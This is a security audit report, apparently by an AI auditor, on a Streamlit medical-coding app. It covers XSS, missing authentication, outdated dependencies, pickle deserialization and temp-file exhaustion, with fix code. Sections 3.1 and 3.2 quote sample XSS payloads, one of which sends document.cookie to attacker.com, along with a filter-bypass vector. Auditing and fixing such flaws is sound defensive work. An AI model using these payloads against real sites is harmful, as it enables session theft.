# Security Audit Report: NeuroCode ICD-10 Auto-Coding System

**Date:** October 26, 2023
**Auditor:** Jules (AI Security Engineer)
**Target:** NeuroCode Source Code (Python/Streamlit/TensorFlow)

## 1. Executive Summary

A comprehensive security audit was performed on the NeuroCode ICD-10 Auto-Coding System. The application is a machine learning-powered tool for extracting ICD-10 codes from medical documents (PDFs) and clinical text.

**Key Findings:**
- **Critical Severity**: The application is vulnerable to **Stored Cross-Site Scripting (XSS)** via PDF uploads. Malicious scripts embedded in PDFs can execute in the context of the user's browser, potentially stealing sessions or data.
- **High Severity**: The application lacks **Authentication**, exposing sensitive medical data processing capabilities to any user with network access.
- **High Severity**: The application uses outdated dependencies with known vulnerabilities (e.g., TensorFlow 2.13.0, PyPDF2).
- **Medium Severity**: Insecure deserialization of machine learning models and potential for Denial of Service (DoS) attacks via resource exhaustion were identified.

**Overall Risk Rating: HIGH**

Immediate remediation of the Critical and High severity issues is recommended before deployment.

---

## 2. Project Overview

### 2.1 Technology Stack
- **Language**: Python 3.9+
- **Frontend/Web Framework**: Streamlit
- **Machine Learning**: TensorFlow/Keras, Scikit-learn
- **PDF Processing**: pdfplumber, pdf2image, PyPDF2, Tesseract OCR
- **Deployment**: Assumed Google Colab or local server

### 2.2 Attack Surface
- **Entry Points**:
    - **File Upload**: Users can upload PDF documents for processing.
    - **Text Input**: Users can input clinical text directly.
- **Data Flows**:
    - Uploaded files -> Temporary storage -> PDF Extraction -> Text Processing -> Model Inference -> Display.
    - User input -> Validation -> Text Processing -> Model Inference -> Display.
- **External Dependencies**: TensorFlow models, NLTK data, System-level tools (Poppler, Tesseract).

---

## 3. Vulnerability Discovery

### 3.1 [CRITICAL] Stored Cross-Site Scripting (XSS) via PDF Upload

**Vulnerability Category**: Injection / XSS
**Affected Component**: `streamlit_app/app.py` (lines 280-289, 321)
**Severity**: **Critical**

**Description**:
The application extracts text from uploaded PDF files using `src/pdf_extractor.py`. This extracted text is then rendered directly into the HTML of the Streamlit application using `st.markdown(..., unsafe_allow_html=True)`. There is **no sanitization** performed on the extracted text before it is injected into the HTML DOM.

**Attack Scenario**:
1. An attacker creates a malicious PDF document containing text that mimics HTML/JavaScript, e.g., `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>` or hidden text with `<img src=x onerror=alert(1)>`.
2. The attacker uploads this PDF to the application.
3. The application extracts the text, including the malicious script.
4. The application renders the extracted text in the "Preview" step.
5. The script executes in the victim's browser (or the attacker's own session if they are testing). If an admin or another user views this (e.g., in a shared environment or if the app stored results), their session could be compromised.

**Code Evidence**:
```python
# streamlit_app/app.py

# Extraction (Result contains raw text from PDF)
result = extractor.smart_extract(tmp_path)
if result.success:
    st.session_state.extracted_text = result.full_text  # malicious text stored here

# Rendering (Vulnerable)
st.markdown(f"""
<div ...>
    <p ...>
{st.session_state.extracted_text}  <-- INJECTION POINT
    </p>
</div>
""", unsafe_allow_html=True)
```

---

### 3.2 [HIGH] Reflected Cross-Site Scripting (XSS) via Text Input

**Vulnerability Category**: Injection / XSS
**Affected Component**: `streamlit_app/security.py` (InputValidator), `streamlit_app/app.py`
**Severity**: **High**

**Description**:
The application attempts to validate text input using a "blacklist" approach (`DANGEROUS_PATTERNS` regex). Blacklists are notoriously difficult to maintain and easily bypassed. The validator fails to block several dangerous HTML tags (e.g., `<iframe>`, `<object>`, `<embed>`, `<link>`) and obfuscated payloads.

**Attack Scenario**:
1. An attacker inputs `<iframe src="javascript:alert(1)"></iframe>` or `<object data="javascript:alert(1)">`.
2. The `InputValidator` checks for `<script`, `javascript:`, `on\w+\s*=`, etc.
   - `<iframe>` is not in the blacklist.
   - `javascript:` inside `src` attribute might be caught if the regex matches simply `javascript:`, but `<iframe src=" data:text/html;base64,...">` would bypass it if `data:text/html` is blocked but `data:text/html;base64` isn't (regex `data:text/html` is specific).
   - Simpler bypass: `<img src=x on error=alert(1)>` (space between `on` and `error` bypasses `on\w+\s*=`, though browser support varies, but other event handlers or SVG vectors exist).
3. The input is rendered via `st.markdown(..., unsafe_allow_html=True)`.
4. The payload executes.

**Code Evidence**:
```python
# streamlit_app/security.py
DANGEROUS_PATTERNS = [
    r'<script',  # XSS
    r'javascript:',  # XSS
    r'on\w+\s*=',  # Event handlers
    ...
]
# Incomplete blacklist allowing <iframe>, <object>, etc.
```

---

### 3.3 [HIGH] Missing Authentication and Authorization

**Vulnerability Category**: Broken Access Control
**Affected Component**: Entire Application
**Severity**: **High**

**Description**:
The application does not implement any user authentication (Login/Logout). It relies on "security through obscurity" or network-level restrictions (which are not part of the code). Any user who can access the Streamlit port can upload files, run inference, and potentially exploit vulnerabilities.

**Attack Scenario**:
1. Attacker discovers the exposed Streamlit app (e.g., via Shodan or port scanning).
2. Attacker uses the app to process unlimited documents (DoS) or attempts to exploit XSS/RCE.
3. If the app processes sensitive PHI (Protected Health Information), unauthorized access is a HIPAA violation.

---

### 3.4 [HIGH] Vulnerable Third-Party Dependencies

**Vulnerability Category**: Vulnerable and Outdated Components
**Affected Component**: `requirements.txt`
**Severity**: **High**

**Description**:
The application specifies outdated versions of critical libraries:
- `tensorflow==2.13.0`: Vulnerable to multiple CVEs (e.g., CVE-2023-41320) allowing DoS or potential RCE via malformed models/inputs.
- `PyPDF2==3.0.0`: Deprecated (superseded by `pypdf`) and vulnerable to infinite loops (DoS) when parsing malformed PDFs (CVE-2023-36464).

**Recommendation**: Update to latest stable versions (`tensorflow>=2.16.1`, `pypdf>=4.0.0`).

---

### 3.5 [MEDIUM] Insecure Deserialization

**Vulnerability Category**: Insecure Deserialization
**Affected Component**: `src/model_inference.py`
**Severity**: **Medium**

**Description**:
The application uses `pickle` and `torch.load` (which uses pickle by default) to load model artifacts (`vocabulary.pkl`, `label_encoder.pkl`, `icd10_cnn_latest.pt`). If an attacker can modify these files (e.g., via a separate file upload vulnerability or compromised file system), they can achieve Remote Code Execution (RCE) when the app loads the model.

**Code Evidence**:
```python
with open(vocab_path, 'rb') as f:
    self.vocabulary = pickle.load(f)  # Unsafe

checkpoint = torch.load(model_path, map_location=self.device, weights_only=False) # Unsafe
```

---

### 3.6 [MEDIUM] Resource Exhaustion (DoS)

**Vulnerability Category**: Denial of Service
**Affected Component**: `streamlit_app/app.py`
**Severity**: **Medium**

**Description**:
The application writes uploaded PDFs to temporary files using `tempfile.NamedTemporaryFile(delete=False)`. It **never deletes** these files. Over time, or during an attack, this will fill up the server's disk space, causing the application and potentially the server to crash.
Additionally, Streamlit's file uploader reads the entire file into memory before processing, allowing memory exhaustion if large files are uploaded concurrently (though a 4MB check exists, it's applied after upload).

**Code Evidence**:
```python
with tempfile.NamedTemporaryFile(delete=False, suffix='.pdf') as tmp:
    tmp.write(uploaded_file.getvalue())
    # No cleanup code (os.remove) afterwards
```

---

### 3.7 [LOW] Insufficient Logging and Monitoring

**Vulnerability Category**: Security Logging and Monitoring Failures
**Affected Component**: `streamlit_app/security.py`, `src/pdf_extractor.py`
**Severity**: **Low**

**Description**:
The application logs to `stdout`/`stderr` but lacks structured security logging. Failed validation attempts, rate limit breaches, and errors are shown to the user but not persistently logged for auditing.

---

## 4. Remediation Guide

### 4.1 Fix XSS (Critical & High)
**Strategy**: escape HTML content before rendering and avoid `unsafe_allow_html=True` whenever possible. If HTML styling is needed, use `st.markdown` with standard Markdown or sanitize strictly with a library like `bleach`.

**Corrected Code (`streamlit_app/app.py`):**
```python
import html

# Inside step_2_preview:
safe_text = html.escape(st.session_state.extracted_text)

# Render using Markdown (safe by default) or sanitized HTML
st.markdown(f"""
<div class="preview-box">
    <p>{safe_text}</p>
</div>
""", unsafe_allow_html=True)
# Note: Even with unsafe_allow_html=True, escaping the variable {safe_text} prevents execution.
# Better approach: Use st.text_area for preview (read-only)
st.text_area("Preview", value=st.session_state.extracted_text, height=300, disabled=True)
```

**Corrected Code (`streamlit_app/security.py`):**
Replace `InputValidator` with a robust sanitization library.
```python
import bleach

class InputValidator:
    @classmethod
    def sanitize_text(cls, text: str) -> str:
        # Allow only safe tags (or none)
        return bleach.clean(text, tags=[], strip=True)
```

### 4.2 Fix Resource Exhaustion (Medium)
**Strategy**: Use `tempfile` as a context manager correctly or ensure deletion.

**Corrected Code (`streamlit_app/app.py`):**
```python
import tempfile
import os

# ...
with tempfile.NamedTemporaryFile(delete=False, suffix='.pdf') as tmp:
    tmp.write(uploaded_file.getvalue())
    tmp_path = tmp.name

try:
    extractor = HybridPDFExtractor()
    result = extractor.smart_extract(tmp_path)
    # ... handle result ...
finally:
    # Ensure cleanup
    if os.path.exists(tmp_path):
        os.remove(tmp_path)
```

### 4.3 Fix Insecure Deserialization (Medium)
**Strategy**: Use safer formats (JSON, SafeTensors) where possible. For PyTorch, use `weights_only=True` if possible (requires newer PyTorch and saving state dict only).

**Corrected Code (`src/model_inference.py`):**
```python
# For PyTorch (if model allows)
checkpoint = torch.load(model_path, map_location=self.device, weights_only=True)

# For vocabulary (use JSON instead of Pickle)
import json
with open(vocab_path.replace('.pkl', '.json'), 'r') as f:
    self.vocabulary = json.load(f)
```

### 4.4 Dependency Updates
Update `requirements.txt`:
```text
tensorflow>=2.16.1
pypdf>=4.0.0 (Replace PyPDF2)
pdfplumber>=0.10.0
scikit-learn>=1.3.2
```

---

## 5. Security Hardening Recommendations

1.  **Authentication**: Implement a login mechanism. For Streamlit, usage of `streamlit-authenticator` or putting the app behind an OAuth proxy (like OAuth2 Proxy or Cloudflare Access) is recommended.
2.  **Content Security Policy (CSP)**: Configure strict CSP headers. The current implementation in `security.py` uses `<meta>` tags which are insufficient. Configure the web server (e.g., Nginx) or Streamlit config to send proper headers.
3.  **Secrets Management**: Do not store any API keys or secrets in code. Use environment variables (`os.environ.get('SECRET_KEY')`).
4.  **Input Sanitization**: Integrate `bleach` for all text inputs.
5.  **Audit Logs**: Implement a `logging` handler that writes security events (login attempts, validation failures, file uploads) to a secure log file or SIEM.

---

## 6. Final Risk Summary Table

| Vulnerability ID | Vulnerability Name | Severity | Status | Recommended Fix |
| :--- | :--- | :--- | :--- | :--- |
| VULN-001 | Stored XSS via PDF Upload | **Critical** | Needs Fix | Escape output / Sanitize input |
| VULN-002 | Reflected XSS via Text Input | **High** | Needs Fix | Escape output / Use Bleach |
| VULN-003 | Missing Authentication | **High** | Needs Fix | Implement Auth / OAuth Proxy |
| VULN-004 | Vulnerable Dependencies | **High** | Needs Fix | Update `requirements.txt` |
| VULN-005 | Insecure Deserialization | **Medium** | Needs Fix | Use JSON/SafeTensors |
| VULN-006 | Resource Exhaustion (DoS) | **Medium** | Needs Fix | Delete temp files |
| VULN-007 | Insufficient Logging | **Low** | Improvement | Add structured logging |
